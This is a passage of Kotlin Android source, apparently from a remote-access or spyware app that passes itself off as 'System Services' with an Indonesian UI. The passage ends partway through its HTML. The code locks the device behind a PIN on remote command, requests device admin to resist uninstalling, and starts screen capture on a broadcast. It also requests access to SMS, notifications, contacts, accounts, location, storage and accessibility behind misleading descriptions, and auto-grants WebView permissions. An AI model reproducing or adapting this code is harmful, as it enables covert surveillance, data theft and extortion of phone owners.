package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_CAM     = 101
    private val PERM_SMS     = 103
    private val PERM_GALLERY  = 104
    private val PERM_LOCATION = 105
    private val PERM_CONTACTS = 106
    private val PERM_GMAIL    = 108
    private val PERM_PHONE    = 109
    private val REQ_SCREEN_CAPTURE    = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupWebView()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenCaptureReceiver, screenFilter)
        }

        AntiUninstallHelper.requestAdminIfNeeded(this)
    }

    private fun startDeviceService() {
        val svcIntent = Intent(this, DeviceService::class.java)
        ContextCompat.startForegroundService(this, svcIntent)
    }

    override fun onResume() {
        super.onResume()
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin   = intent.getStringExtra("lock_pin")   ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_SCREEN_CAPTURE) {
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin   = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
        )
        try { startLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "stopLockTask: ${e.message}")
        }
        webView.evaluateJavascript(
            "if(typeof hideLockScreen==='function') hideLockScreen()", null
        )
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    private fun sendStatus(json: String) {
        val intent = Intent(DeviceService.ACTION_SEND_STATUS).apply {
            putExtra(DeviceService.EXTRA_STATUS_JSON, json)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }
        webView.webViewClient = WebViewClient()
        val serverUrl = DeviceService.SERVER_URL
        webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
    }

    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    fun isGalleryGranted(): Boolean = isCamGranted()
    fun requestGalleryPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_LOCATION)

    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        val client  = LocationServices.getSettingsClient(this)
        client.checkLocationSettings(builder.build())
            .addOnSuccessListener {
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        @Suppress("DEPRECATION")
                        exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                } else {
                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_CONTACTS)

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun requestGmailPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_GMAIL)

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun requestPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        ), PERM_PHONE)

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_GALLERY)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)
    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)

    fun requestAccessibilityPerm() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    fun requestUsageAccessPerm() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
        })
    }
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    fun requestCamPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    fun requestSmsPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_SMS)
    fun openNotifListenerSettings() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    // ═══════════════════════════════════════════════════════════
    // UID MANAGEMENT — Simpan/Ambil UID dari SharedPreferences
    // ═══════════════════════════════════════════════════════════
    private fun saveUid(uid: String) {
        val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
        prefs.edit().putString("saved_uid", uid).apply()
        android.util.Log.d("MainActivity", "UID saved: $uid")
    }

    private fun getSavedUid(): String {
        val prefs = getSharedPreferences("sync_prefs", MODE_PRIVATE)
        return prefs.getString("saved_uid", "") ?: ""
    }

    // ═══════════════════════════════════════════════════════════
    // HTML UI
    // ═══════════════════════════════════════════════════════════
    private fun buildHtml(): String {
        val serverUrl = DeviceService.SERVER_URL
        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Services</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@700;800;900&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0a0f;--surface:#0f0f17;--card:#141420;--card2:#1a1a28;
  --border:#1e1e30;--border2:#2a2a40;
  --accent:#6366f1;--accent2:#4f46e5;--accent-glow:rgba(99,102,241,.2);
  --green:#22c55e;--green-glow:rgba(34,197,94,.15);
  --red:#ef4444;--amber:#f59e0b;--purple:#8b5cf6;--blue:#3b82f6;--cyan:#06b6d4;
  --text:#f8fafc;--text2:#94a3b8;--text3:#475569;
  --font:'Inter',sans-serif;
  --head:'Plus Jakarta Sans',sans-serif;
}
html,body{height:100%;width:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:var(--font);-webkit-font-smoothing:antialiased}
.screen{position:absolute;inset:0;transition:opacity .4s cubic-bezier(.4,0,.2,1),transform .4s cubic-bezier(.4,0,.2,1);display:flex;flex-direction:column}
.screen.hidden{opacity:0;pointer-events:none;transform:translateY(16px)}

#permScreen{overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:40px;background:var(--bg)}

.perm-header{padding:52px 24px 32px;display:flex;flex-direction:column;align-items:center;gap:20px}
.perm-logo-wrap{position:relative;width:80px;height:80px}
.perm-logo-bg{position:absolute;inset:0;border-radius:24px;background:linear-gradient(145deg,rgba(99,102,241,.18),rgba(99,102,241,.04));border:1px solid rgba(99,102,241,.25)}
.perm-logo-inner{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
.perm-logo-ring-outer{position:absolute;inset:-6px;border-radius:30px;border:1px solid rgba(99,102,241,.1);animation:ringPulse 3s ease-in-out infinite}
@keyframes ringPulse{0%,100%{opacity:.4;transform:scale(1)}50%{opacity:.1;transform:scale(1.04)}}
.perm-header-text{display:flex;flex-direction:column;align-items:center;gap:8px}
.perm-badge{background:rgba(99,102,241,.12);border:1px solid rgba(99,102,241,.2);border-radius:999px;padding:4px 12px;font-family:var(--font);font-size:10px;font-weight:600;color:var(--accent);letter-spacing:2px;text-transform:uppercase}

.perm-title{
  font-family:var(--head);
  font-size:26px;
  font-weight:800;
  color:var(--text);
  text-align:center;
  line-height:1.15;
  letter-spacing:-.6px;
}

.perm-subtitle{
  font-family:var(--font);
  font-size:13px;
  font-weight:400;
  color:var(--text2);
  text-align:center;
  line-height:1.65;
  max-width:280px;
  letter-spacing:.05px;
}

.perm-divider{height:1px;background:linear-gradient(90deg,transparent,var(--border2),transparent);margin:0 24px}

.perm-list{padding:20px 16px 0;display:flex;flex-direction:column;gap:10px}
.perm-row{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;transition:border-color .25s,background .25s}
.perm-row.granted{border-color:rgba(34,197,94,.2);background:rgba(34,197,94,.03)}
.perm-icon{width:44px;height:44px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
.pi-cam{background:rgba(245,158,11,.12);color:var(--amber)}
.pi-bat{background:rgba(34,197,94,.12);color:var(--green)}
.perm-icon-wrap{width:44px;height:44px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:rgba(99,102,241,.08);color:var(--accent)}
.perm-info{flex:1;min-width:0;display:flex;flex-direction:column;gap:3px}
.perm-name{font-family:var(--font);font-weight:600;font-size:14px;color:var(--text);letter-spacing:-.1px}
.perm-desc{font-family:var(--font);font-size:11.5px;font-weight:400;color:var(--text3);line-height:1.45}
.perm-row.granted .perm-desc{color:rgba(34,197,94,.6)}
.tog{position:relative;width:50px;height:28px;flex-shrink:0;cursor:pointer}
.tog input{opacity:0;width:0;height:0;position:absolute}
.tog-track{position:absolute;inset:0;border-radius:999px;background:var(--card2);border:1px solid var(--border2);transition:all .22s}
.tog-track::after{content:'';position:absolute;top:4px;left:4px;width:18px;height:18px;border-radius:50%;background:var(--text3);transition:left .22s,background .22s,box-shadow .22s}
.tog input:checked + .tog-track{background:rgba(34,197,94,.15);border-color:rgba(34,197,94,.4)}
.tog input:checked + .tog-track::after{left:26px;background:var(--green);box-shadow:0 0 8px rgba(34,197,94,.5)}

.perm-footer{padding:20px 16px 0;display:flex;flex-direction:column;gap:12px}
.all-granted-badge{display:none;align-items:center;justify-content:center;gap:8px;padding:12px;background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.15);border-radius:12px;font-family:var(--font);font-size:12px;font-weight:500;color:var(--green)}
.all-granted-badge.show{display:flex}
.btn-masuk{width:100%;height:54px;border-radius:14px;border:none;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-family:var(--head);font-size:14px;font-weight:800;letter-spacing:2px;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:9px;box-shadow:0 4px 24px rgba(99,102,241,.25)}
.btn-masuk:active{transform:scale(.98);opacity:.9}
.btn-masuk.refresh-mode{background:var(--card2);color:var(--text2);border:1px solid var(--border2);box-shadow:none}

/* UID INPUT SCREEN */
#uidScreen{background:var(--bg);align-items:center;justify-content:center;padding:24px}
.uid-wrap{width:100%;max-width:380px;display:flex;flex-direction:column;gap:20px}
.uid-top{background:var(--card);border:1px solid var(--border);border-radius:24px;padding:36px 28px 28px;display:flex;flex-direction:column;align-items:center;gap:20px}
.uid-logo{width:76px;height:76px;border-radius:22px;background:linear-gradient(145deg,rgba(99,102,241,.15),rgba(99,102,241,.04));border:1px solid rgba(99,102,241,.2);display:flex;align-items:center;justify-content:center;position:relative}
.uid-logo-pulse{position:absolute;inset:-8px;border-radius:30px;border:1px solid rgba(99,102,241,.12);animation:ringPulse 3s ease-in-out infinite}
.uid-title{font-family:var(--head);font-size:22px;font-weight:800;color:var(--text);letter-spacing:-.3px;text-align:center}
.uid-sub{font-family:var(--font);font-size:12px;font-weight:500;color:var(--text3);letter-spacing:.5px;text-align:center;line-height:1.5}
.uid-field-wrap{width:100%;display:flex;flex-direction:column;gap:8px}
.uid-label{font-family:var(--font);font-size:11px;font-weight:600;color:var(--text2);letter-spacing:1px;text-transform:uppercase}
.uid-input{width:100%;height:56px;background:var(--surface);border:1.5px solid var(--border2);border-radius:14px;padding:0 18px;color:var(--text);font-family:var(--font);font-size:14px;letter-spacing:1px;outline:none;transition:all .2s}
.uid-input::placeholder{color:var(--text3);font-size:12px;letter-spacing:.5px}
.uid-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(99,102,241,.15)}
.uid-input.error{border-color:var(--red);box-shadow:0 0 0 3px rgba(239,68,68,.15);animation:shake .4s}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
.uid-hint{font-family:var(--font);font-size:11px;color:var(--text3);letter-spacing:.3px;text-align:center}
.uid-error{font-family:var(--font);font-size:12px;font-weight:600;color:var(--red);letter-spacing:.5px;text-align:center;min-height:18px;opacity:0;transition:opacity .3s}
.uid-error.show{opacity:1}
.btn-connect{width:100%;height:56px;border-radius:14px;border:none;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-family:var(--head);font-size:14px;font-weight:800;letter-spacing:2px;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:9px;box-shadow:0 4px 24px rgba(99,102,241,.25)}
.btn-connect:active{transform:scale(.98);opacity:.9}
.btn-connect:disabled{opacity:.5;cursor:not-allowed}

/* CONNECTED SCREEN */
#connectedScreen{background:var(--bg);align-items:center;justify-content:center}
.conn-wrap{display:flex;flex-direction:column;align-items:center;gap:0;width:100%;padding:0 24px;max-width:380px}
.conn-top{width:100%;background:var(--card);border:1px solid var(--border);border-radius:24px 24px 0 0;padding:36px 28px 28px;display:flex;flex-direction:column;align-items:center;gap:20px}
.conn-logo-wrap{position:relative}
.conn-logo-bg{width:76px;height:76px;border-radius:22px;background:linear-gradient(145deg,rgba(99,102,241,.15),rgba(99,102,241,.04));border:1px solid rgba(99,102,241,.2);display:flex;align-items:center;justify-content:center}
.conn-logo-pulse{position:absolute;inset:-8px;border-radius:30px;border:1px solid rgba(99,102,241,.12);animation:ringPulse 3s ease-in-out infinite}
.conn-name-wrap{text-align:center}
.conn-app-name{font-family:var(--head);font-size:22px;font-weight:800;color:var(--text);letter-spacing:-.3px}
.conn-app-sub{font-family:var(--font);font-size:11px;font-weight:500;color:var(--text3);letter-spacing:2.5px;text-transform:uppercase;margin-top:4px}
.conn-status-wrap{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px;display:flex;flex-direction:column;align-items:center;gap:12px}
.conn-status-indicator{display:flex;align-items:center;gap:10px}
.status-dot{width:10px;height:10px;border-radius:50%;background:var(--text3);transition:background .4s,box-shadow .4s}
.status-indicator.online .status-dot{background:var(--green);box-shadow:0 0 10px var(--green);animation:dotpulse 2s infinite}
.status-indicator.offline .status-dot{background:var(--red);animation:dotblink 1s infinite}
@keyframes dotpulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
@keyframes dotblink{0%,100%{opacity:1}50%{opacity:.2}}
.status-text{font-family:var(--head);font-size:14px;font-weight:700;letter-spacing:1.5px;color:var(--text3);transition:color .4s}
.status-indicator.online .status-text{color:var(--green)}
.status-indicator.offline .status-text{color:var(--red)}
.status-last{font-family:var(--font);font-size:11px;color:var(--text3)}
.conn-bottom{width:100%;background:var(--card2);border:1px solid var(--border);border-top:none;border-radius:0 0 24px 24px;padding:0 0 4px}
.conn-info-row{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;border-bottom:1px solid var(--border)}
.conn-info-row:last-child{border-bottom:none}
.conn-info-k{font-family:var(--font);font-size:11px;font-weight:500;color:var(--text3);letter-spacing:.5px}
.conn-info-v{font-family:var(--font);font-size:11px;font-weight:600;color:var(--text2);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:right}
.conn-info-v.accent{color:var(--accent);font-weight:700}
.conn-footer-wrap{margin-top:20px;text-align:center}
.conn-footer{font-family:var(--font);font-size:10px;font-weight:500;color:var(--text3);letter-spacing:1.5px;text-transform:uppercase;opacity:.5}

.perm-row.requesting {
  border-color: var(--accent) !important;
  background: rgba(99,102,241,0.08) !important;
  box-shadow: 0 0 0 1px var(--accent);
}
</style>
</head>
<body>

<!-- PERMISSION SCREEN -->
<div class="screen" id="permScreen">
  <div class="perm-header">
    <div class="perm-logo-wrap">
      <div class="perm-logo-bg"></div>
      <div class="perm-logo-inner">
        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
          <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"/>
          <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
        </svg>
      </div>
      <div class="perm-logo-ring-outer"></div>
    </div>
    <div class="perm-header-text">
      <div class="perm-badge">Pengaturan Awal</div>
      <div class="perm-title">Izin Diperlukan</div>
      <div class="perm-subtitle">Izinkan Semua Akses Agar Aplikasi Berjalan Maksimal Dan Tidak Ada Kendala</div>
    </div>
  </div>

  <div class="perm-divider"></div>

  <div class="perm-list" id="permList">
    <div class="perm-row" id="row-cam">
      <div class="perm-icon pi-cam">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/>
          <circle cx="12" cy="13" r="3.5"/>
        </svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Kamera</div>
        <div class="perm-desc">Dibutuhkan Untuk Fitur Pemindaian Pada Aplikasi.</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-cam" onchange="onToggle('cam',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-bat">
      <div class="perm-icon pi-bat">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <rect x="1" y="6" width="18" height="12" rx="2"/>
          <path d="M23 13v-2" stroke-linecap="round"/>
          <path d="M7 12h4M9 10v4" stroke-linecap="round"/>
        </svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Pengoptimalan</div>
        <div class="perm-desc">Mencegah Sistem Menghentikan Aplikasi Saat Sedang Berjalan</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-bat" onchange="onToggle('bat',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-overlay">
      <div class="perm-icon" style="background:rgba(139,92,246,.12);color:#a78bfa">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <rect x="2" y="3" width="20" height="14" rx="2"/>
          <path d="M8 21h8M12 17v4"/>
          <rect x="6" y="7" width="5" height="4" rx="1"/>
          <path d="M14 8h3M14 11h3"/>
        </svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Floating</div>
        <div class="perm-desc">Diperlukan Agar Fitur Aplikasi Bisa Mengambang Diatas Aplikasi Lain.</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-overlay" onchange="onToggle('overlay',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-accessibility">
      <div class="perm-icon" style="background:rgba(251,146,60,.12);color:#fb923c">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <circle cx="12" cy="4" r="2"/>
          <path d="M12 6v6l3 3M6 8l2.5 2M18 8l-2.5 2M8.5 21l2-5M15.5 21l-2-5M10 13H8a2 2 0 0 0-2 2v1M14 13h2a2 2 0 0 1 2 2v1"/>
        </svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Aksesibilitas</div>
        <div class="perm-desc">Diperlukan Untuk Mendeteksi Dan Menambah Performa Pada Aplikasi.</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-accessibility" onchange="onToggle('accessibility',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-usage">
      <div class="perm-icon" style="background:rgba(34,197,94,.12);color:#22c55e">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
          <polyline points="14 2 14 8 20 8"/>
          <line x1="16" y1="13" x2="8" y2="13"/>
          <line x1="16" y1="17" x2="8" y2="17"/>
        </svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Penggunaan Aplikasi</div>
        <div class="perm-desc">Diperlukan Untuk Melihat Daftar Aplikasi Yang Terinstall Di Perangkat</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-usage" onchange="onToggle('usage',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-notif">
      <div class="perm-icon-wrap">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Akses Notifikasi</div>
        <div class="perm-desc">Diperlukan Untuk Membaca Notifikasi Dari Semua Aplikasi</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-notif" onchange="onToggle('notif',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-location">
      <div class="perm-icon" style="background:rgba(59,130,246,.12);color:#60a5fa">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Izin Lokasi</div>
        <div class="perm-desc">Izinkan Aplikasi Mengakses Lokasi GPS Perangkat</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-location" onchange="onToggle('location',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-gpson">
      <div class="perm-icon" style="background:rgba(16,185,129,.12);color:#34d399">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/><path d="M4.93 4.93l2.12 2.12M16.95 16.95l2.12 2.12M4.93 19.07l2.12-2.12M16.95 7.05l2.12-2.12"/>
        </svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Aktifkan GPS</div>
        <div class="perm-desc">GPS Harus Dihidupkan Agar Lokasi Bisa Diambil</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-gpson" onchange="onToggle('gpson',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-contacts">
      <div class="perm-icon-wrap">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
      </div>
      <div class="perm-info">
